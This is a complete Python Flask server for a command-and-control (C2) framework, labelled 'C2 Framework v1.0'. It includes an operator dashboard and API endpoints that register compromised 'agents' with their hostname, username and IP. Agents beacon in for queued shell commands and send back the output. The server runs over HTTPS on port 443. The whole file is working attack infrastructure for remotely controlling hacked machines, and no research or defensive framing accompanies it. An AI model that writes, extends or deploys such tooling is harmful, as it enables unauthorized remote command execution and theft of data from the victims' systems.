#!/usr/bin/env python3
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import uuid
from datetime import datetime
import ssl

app = Flask(__name__)
CORS(app)

# Same dashboard HTML as before
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Framework Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            height: 100vh;
            overflow: hidden;
        }
        .container { display: flex; height: 100vh; }
        .sidebar {
            width: 350px;
            background: #0d1117;
            border-right: 1px solid #00ff41;
            overflow-y: auto;
            padding: 20px;
        }
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .terminal {
            background: #000000;
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar {
            background: #0d1117;
            border-top: 1px solid #00ff41;
            padding: 15px;
            display: flex;
        }
        .command-bar input {
            background: #000000;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 10px;
            flex: 1;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .command-bar button {
            background: #00ff41;
            color: #000000;
            border: none;
            padding: 10px 20px;
            margin-left: 10px;
            cursor: pointer;
            font-weight: bold;
        }
        .agent-item {
            padding: 10px;
            margin: 5px 0;
            background: #1a1f2e;
            cursor: pointer;
            border-left: 3px solid #00ff41;
        }
        .agent-item:hover { background: #2a2f3e; }
        .agent-item.active { background: #00ff41; color: #000000; }
        .agent-info { font-size: 11px; margin-top: 5px; color: #888; }
        .command-output { color: #cccccc; margin: 5px 0 5px 20px; white-space: pre-wrap; }
        .command-line { color: #00ff41; margin: 5px 0; }
        h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 1px solid #00ff41; padding-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <h2>🕶️ C2 Framework v1.0</h2>
            <div id="agents-list">Loading agents...</div>
        </div>
        <div class="main">
            <div class="terminal" id="terminal">
                <div class="command-line">=== C2 Framework Console ===</div>
                <div id="output-area"></div>
            </div>
            <div class="command-bar">
                <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
                <button onclick="sendCommand()">Execute</button>
            </div>
        </div>
    </div>
    <script>
        let currentAgent = null;
        
        function loadAgents() {
            fetch('/api/agents')
                .then(res => res.json())
                .then(data => {
                    const container = document.getElementById('agents-list');
                    if (data.length === 0) {
                        container.innerHTML = '<div style="padding:20px;">No agents connected</div>';
                        return;
                    }
                    container.innerHTML = '<h3>Active Agents (' + data.length + ')</h3>';
                    data.forEach(agent => {
                        const div = document.createElement('div');
                        div.className = 'agent-item';
                        if (currentAgent === agent.agent_id) div.classList.add('active');
                        div.onclick = () => selectAgent(agent.agent_id);
                        div.innerHTML = '<div><strong>' + agent.agent_id + '</strong></div>' +
                            '<div class="agent-info">' + agent.hostname + ' | ' + agent.username + '<br>IP: ' + agent.ip_address + '</div>';
                        container.appendChild(div);
                    });
                });
        }
        
        function selectAgent(agentId) {
            currentAgent = agentId;
            addToTerminal('[+] Selected agent: ' + agentId);
            loadAgents();
        }
        
        function addToTerminal(text) {
            const output = document.getElementById('output-area');
            const line = document.createElement('div');
            line.innerHTML = '<div>' + text + '</div>';
            output.appendChild(line);
            document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
        }
        
        function sendCommand() {
            const input = document.getElementById('command-input');
            const command = input.value.trim();
            if (!command || !currentAgent) return;
            
            addToTerminal(currentAgent + '# ' + command);
            
            fetch('/api/send_command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ agent_id: currentAgent, command: command })
            });
            
            input.value = '';
        }
        
        function fetchResults() {
            if (currentAgent) {
                fetch('/api/task_results/' + currentAgent)
                    .then(res => res.json())
                    .then(data => {
                        data.forEach(result => {
                            addToTerminal(result.output);
                        });
                    });
            }
        }
        
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCommand();
        });
        
        setInterval(loadAgents, 3000);
        setInterval(fetchResults, 2000);
        loadAgents();
    </script>
</body>
</html>
'''

# Storage
agents = {}
tasks = {}
task_results = {}

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    agent_id = str(uuid.uuid4())[:8]
    agents[agent_id] = {
        'agent_id': agent_id,
        'hostname': data.get('hostname', 'unknown'),
        'username': data.get('username', 'unknown'),
        'os_type': data.get('os_type', 'unknown'),
        'ip_address': data.get('ip_address', request.remote_addr),
        'last_seen': datetime.now().isoformat()
    }
    print(f"[+] Agent registered: {agent_id} ({data.get('hostname')})")
    return jsonify({'agent_id': agent_id, 'sleep_time': 5})

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id in agents:
        agents[agent_id]['last_seen'] = datetime.now().isoformat()
        pending = [{'id': tid, 'command': t['command']} for tid, t in tasks.items() 
                   if t['agent_id'] == agent_id and t['status'] == 'pending']
        for t in pending:
            tasks[t['id']]['status'] = 'sent'
        return jsonify({'tasks': pending})
    return jsonify({'tasks': []})

@app.route('/api/task_result', methods=['POST'])
def task_result():
    data = request.json
    task_id = data.get('task_id')
    if task_id in tasks:
        tasks[task_id]['status'] = 'completed'
        tasks[task_id]['output'] = data.get('output', '')
        agent_id = tasks[task_id]['agent_id']
        if agent_id not in task_results:
            task_results[agent_id] = []
        task_results[agent_id].append({'output': data.get('output', '')})
    return jsonify({'status': 'ok'})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    task_id = str(uuid.uuid4())[:8]
    tasks[task_id] = {
        'id': task_id,
        'agent_id': data.get('agent_id'),
        'command': data.get('command'),
        'status': 'pending'
    }
    print(f"[+] Command sent: {data.get('command')[:50]}")
    return jsonify({'task_id': task_id, 'status': 'sent'})

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/task_results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    results = task_results.get(agent_id, [])
    task_results[agent_id] = []
    return jsonify(results)

if __name__ == '__main__':
    print("="*60)
    print("C2 Framework Server (HTTPS) Starting...")
    print("="*60)
    print(f"[*] HTTPS Dashboard: https://172.24.1.83:443")
    print(f"[*] Press Ctrl+C to stop")
    print("="*60)
    
    # Run with HTTPS
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('ssl_cert.pem', 'ssl_key.pem')
    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False, threaded=True)
